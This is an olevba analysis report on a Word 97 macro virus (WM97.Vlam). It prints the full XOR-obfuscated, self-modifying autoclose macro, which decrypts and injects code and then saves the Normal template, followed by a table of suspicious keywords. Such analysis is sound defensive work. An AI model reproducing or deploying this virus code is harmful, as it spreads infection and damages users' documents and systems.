olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vlam-62191144ddf3bbf6977d5db0e1f4a75654586c7a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vlam-62191144ddf3bbf6977d5db0e1f4a75654586c7a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub autoclose()
'WM97.VLAM
Dim lines(27) As String
lines(1) = "КлҐАччкчҐЧацриаҐЛаэс"
lines(2) = "ЦасҐлкчҐёҐЛкчидйСаихйдса«УЗХчкпажс«УЗЖкихклалсц­ґ¬«ЖкбаИкбрйа"
lines(3) = "ЦасҐбкжҐёҐДжсмуаБкжриалс«УЗХчкпажс«УЗЖкихклалсц­ґ¬«ЖкбаИкбрйа"
lines(4) = "ЦасҐснцҐёҐСнмцБкжриалс«УЗХчкпажс«УЗЖкихклалсц­ґ¬«ЖкбаИкбрйа"
lines(5) = "крчжкбаҐёҐснц«ймлац­ґ©Ґснц«жкрлскгймлац¬"
lines(6) = "ТмснҐлкч"
lines(7) = "«байасаймлацҐґ©Ґлкч«жкрлскгймлац"
lines(8) = "«млцачсймлацҐґ©Ґкрчжкба"
lines(9) = "АлбҐТмсн"
lines(10) = "ТмснҐбкж"
lines(11) = "«байасаймлацҐґ©Ґбкж«жкрлскгймлац"
lines(12) = "«млцачсймлацҐґ©Ґкрчжкба"
lines(13) = "АлбҐТмсн"
lines(14) = "ТмснҐКхсмклц"
lines(15) = "«УмчрцХчксажсмклҐёҐ­ЧлбҐЇҐµ¬"
lines(16) = "«ЖклгмчиЖклуачцмклцҐёҐ­ЧлбҐЇҐµ¬"
lines(17) = "«ЦдуаЛкчидйХчкихсҐёҐ­ЧлбҐЇҐµ¬"
lines(18) = "«Дххймждсмкл«ЦнктУмцрдйЗдцмжАбмскчҐёҐ­ЧлбҐЇҐµ¬"
lines(19) = "«Дххймждсмкл«ЖкиидлбЗдчц­§Сккйц§¬«Жклсчкйц­§иджчк§¬«АлдзйабҐёҐ­ЧлбҐЇҐµ¬"
lines(20) = "«Дххймждсмкл«АлдзйаЖдлжайОаьҐёҐтбЖдлжайБмцдзйаб"
lines(21) = "«Дххймждсмкл«ЦжчаалРхбдсмлвҐёҐ­ЧлбҐЇҐµ¬"
lines(22) = "«ЦалбИдмйДссджнҐёҐґ"
lines(23) = "АлбҐТмсн"
lines(24) = "МгҐБдь­Лкт­¬¬ҐёҐ·ІҐДлбҐНкрч­Лкт­¬¬Ґ№ҐґµҐСнал"
lines(25) = "мҐёҐМлс­ЧлбҐЇҐґµ¬"
lines(26) = "ЖкиидлбЗдчц­м¬«Жклсчкйц­м¬«АлдзйабҐёҐ­ЧлбҐЇҐµ¬"
lines(27) = "АлбҐМг"
For y = 1 To 27
mycode = mycode & Crypt(lines(y)) & vbCr
Next
ThisDocument.VBProject.VBComponents(1).CodeModule.insertlines 48, mycode
Call runme
NormalTemplate.VBProject.VBComponents(1).CodeModule.deletelines 48, 28
ActiveDocument.VBProject.VBComponents(1).CodeModule.deletelines 48, 28
ActiveDocument.Save
NormalTemplate.Save
End Sub
Private Function Crypt(OldString)
For i = 1 To Len(OldString)
Crypt = Crypt & Chr(Asc(Mid(OldString, i, 1)) Xor 133)
Next
End Function

Private Sub runme()

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

